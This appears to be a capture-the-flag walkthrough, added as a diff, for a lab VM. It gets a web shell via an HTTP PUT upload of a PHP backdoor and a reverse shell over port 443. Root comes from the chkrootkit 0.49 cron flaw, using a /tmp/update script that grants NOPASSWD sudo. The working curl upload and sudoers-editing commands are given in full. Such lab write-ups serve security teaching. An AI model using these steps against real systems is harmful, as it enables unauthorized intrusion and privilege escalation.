@@ -1,0 +1,94 @@
+
+-----------------first access - getting a webshell-----------------
+
+1. nmap scan shows only ports 80 and 22 are open. port 80 runs lighthttpd/1.4.28.
+
+2. surfing to port 80 shows a webpage with an image.
+
+3. tried to find vulnurabilities for lighthttpd/1.4.28 but found nothing useful.
+
+4. using dirb <dirb http://10.0.2.15 /usr/share/dirb/wordlists/common.txt> shows there is a directory named "/test"
+   surfing to it shows its empty.
+
+5. sending an OPTION request with burp shows that the "test" directory accepts "PUT" requsts:
+	OPTIONS request: "curl -X OPTIONS http://10.0.2.15/test -v" (you have to use the "-v" option to view the response)
+	OPTIONS response: "Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK"
+
+6. tried to generate a PUT request and upload a file with curl:
+		curl -T /usr/share/webshells/php/simple-backdoor.php http://10.0.2.15/test/backdoor.php -v
+   but got an error in return:
+   		417 - Expectation Failed
+
+   looking online for that error shows that the cURL request sent the PUT request with an "Expect" header, and the server responded to that header.
+   checking the request sent in curl we do see that "Expect" header:
+   		> PUT http://10.0.2.15/test/backdoor.php HTTP/1.1
+		> Host: 10.0.2.15
+		> User-Agent: curl/7.68.0
+		> Accept: */*
+		> Proxy-Connection: Keep-Alive
+		> Content-Length: 328
+		> Expect: 100-continue
+
+7. sending the cURL request to burp:
+		url -T /usr/share/webshells/php/simple-backdoor.php http://10.0.2.15/test/backdoor.php -v -x 127.0.0.1:8080
+   and removing the "Expect" header:
+   		PUT /test/backdoor.php HTTP/1.1
+		Host: 10.0.2.15
+		User-Agent: curl/7.68.0
+		Accept: */*
+		Content-Length: 328
+		Connection: close
+   WORKS! WE GOT A webshell!
+
+
+
+-----------------getting a reverse shell-----------------
+8.uploading some PHP reverse shells and trying to run them didn't work.
+
+9. running "ps aux" we see that the configuration of the lighthttpd server is located at /etc/lighttpd/lighttpd.conf.
+
+10. looking at the configuration, we see that there is an error file located at /var/log/lighttpd/error.log
+	in that file, we can see the connection attempts our reverse shell is trying to make.
+		for example:
+			2021-09-19 10:31:01: (mod_fastcgi.c.2701) FastCGI-stderr: PHP Notice:  Undefined variable: daemon in /var/www/test/rev.php on line 139
+			PHP Warning:  fsockopen(): unable to connect to 127.0.0.1:1234 (Connection timed out) in /var/www/test/rev.php on line 55
+			PHP Notice:  Undefined variable: daemon in /var/www/test/rev.php on line 139
+	we also get an error in the browser when surfing to the reverse shell file:
+			WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110)
+
+	so it seems like the server can't make a connection back to us...
+
+11. maybe a firewall is blocking the connection back to us.. trying to change the port to 80 didn't change anything, but 443 worked!
+	so now if we listen on port 443 and surf to the reverse shell we can run code on the server.
+
+
+-----------------getting root-----------------
+12. tried to look for crons but found only default stuff and passwd backup.
+		find /etc/cron* -exec echo "===============file name: {}" \; -exec cat {} \; > /var/www/test/crontabs.txt
+	after more search found a cron that runs chkrootkit - a tool to find viruses on the system.
+		/etc/cron.daily/chkrootkit
+
+13. the version of the chkrootkit is 0.49 (calling "chkrootkit -V").
+	there is a local PE vulnerability to that version:
+		"""
+		The line 'file_port=$file_port $i' will execute all files specified in
+		$SLAPPER_FILES as the user chkrootkit is running (usually root), if
+		$file_port is empty, because of missing quotation marks around the
+		variable assignment.
+
+		Steps to reproduce:
+
+		- Put an executable file named 'update' with non-root owner in /tmp (not
+		mounted noexec, obviously)
+		- Run chkrootkit (as uid 0)
+
+		Result: The file /tmp/update will be executed as root, thus effectively
+		rooting your box, if malicious content is placed inside the file.
+		"""
+14. to exploit this vulnurability do these steps:
+	a. create the file /tmp/update and make it executeble.
+		type /tmp/update
+		chmod +x /tmp/update
+	b. put there a command to make our "www-data" user sudoer
+		chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
+	c. use sudo and... we are root!
